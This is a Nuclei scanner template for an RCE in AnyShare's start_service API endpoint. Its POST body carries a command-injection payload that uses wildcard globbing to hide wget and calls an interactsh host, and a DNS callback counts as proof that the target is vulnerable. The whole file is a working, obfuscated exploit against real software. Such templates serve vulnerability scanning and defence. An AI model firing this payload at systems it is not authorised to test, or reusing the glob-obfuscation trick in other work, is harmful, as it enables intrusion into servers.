id: AnyShare-start_service-RCE

info:
  name: AnyShare-start_service-RCE
  author: iSee857
  severity: Critical
  description: |
    AnyShare-start_service-RCE.
  metadata:
    verified: true

http:
  - raw:
      - |
        POST /api/ServiceAgent/start_service HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        ["com;/u?r/b?n/w??t http://{{interactsh-url}}"]

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: status
        status:
          - 200
